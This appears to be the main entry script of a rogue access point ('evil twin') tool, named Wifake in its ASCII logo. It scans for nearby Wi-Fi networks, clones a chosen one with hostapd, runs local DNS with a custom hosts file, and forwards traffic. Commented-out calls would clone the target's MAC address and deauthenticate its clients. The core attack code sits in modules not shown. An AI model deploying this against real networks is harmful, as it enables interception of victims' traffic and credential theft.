import subprocess
import sys
from subprocess import Popen, call, PIPE

# local imports
from utils import exec_sync, print_stdout
import interface
import monitor
import ap

MIN_ARGS = 1
ARGUMENTS = sys.argv[1:]

# check arguments
if len(ARGUMENTS) < MIN_ARGS:
    print("Usage: python3 main.py <INTERFACE> [--forward=FW_INTERFACE] [--hosts=HOSTS]")
    print("                                   [--apconf=HOSTAPD_CONF]")
    sys.exit(1)
    
INTERFACE = ARGUMENTS[0]
FW_INTERFACE = None
HOSTS = None
AP_CONF = None
for arg in ARGUMENTS[1:]:
    if arg.find("--forward=") == 0:
        FW_INTERFACE = arg.split("--forward=")[-1]
    elif arg.find("--hosts=") == 0:
        HOSTS = arg.split("--hosts=")[-1]
    elif arg.find("--apconf=") == 0:
        AP_CONF = arg.split("--apconf=")[-1]

logo = """
 __      __.__  _____        __           
/  \    /  \__|/ ____\____  |  | __ ____  
\   \/\/   /  \   __\\\\__  \ |  |/ // __ \ 
 \        /|  ||  |   / __ \|    <\  ___/ 
  \__/\  / |__||__|  (____  /__|_ \\\\___  >
       \/                 \/     \/    \/ 
"""
print(logo)

try:
    # Ensure the interfaces exists and is wireless
    interface.verify_interface(INTERFACE, wireless=True)
    if FW_INTERFACE != None:
        interface.verify_interface(FW_INTERFACE, wireless=False)

    if AP_CONF == None:
        # Scan for nearby access points
        monitor.scan(INTERFACE)

        # Select an access point, then create a hostapd configuration
        target_id = ap.choose_access_point()
        ap.make_hostapd_conf(target_id, INTERFACE)

    # Set up local gateway and DNS
    interface.establish_gateway(INTERFACE)
    interface.establish_dns(INTERFACE, HOSTS)

    # Set up forwarding
    if FW_INTERFACE != None:
        interface.establish_forward(FW_INTERFACE)

    # Start hosting the access point
    #ap.clone_mac(target_id, INTERFACE)
    ap.execute_hostapd(AP_CONF)

    # Deauth clients on target network
    # Disabled for now, may interfere with hostapd
    # ap.deauth(target_id, INTERFACE)

    # print_stdout(iwconfig)
    print("You did it!")

# Clean up after requesting exit (Ctrl+C)
except KeyboardInterrupt:
    clean_up = False
    while (not clean_up):
        try:
            print("")
            print("")
            print("! KeyboardInterrupt detected. Exiting...")
            interface.stop_dns()
            if FW_INTERFACE != None:
                interface.stop_forward(FW_INTERFACE)
            monitor.exit_monitor_mode(INTERFACE)
            interface.down_interface(INTERFACE)
            #ap.reset_mac(INTERFACE)
            clean_up = True
        except KeyboardInterrupt:
            pass
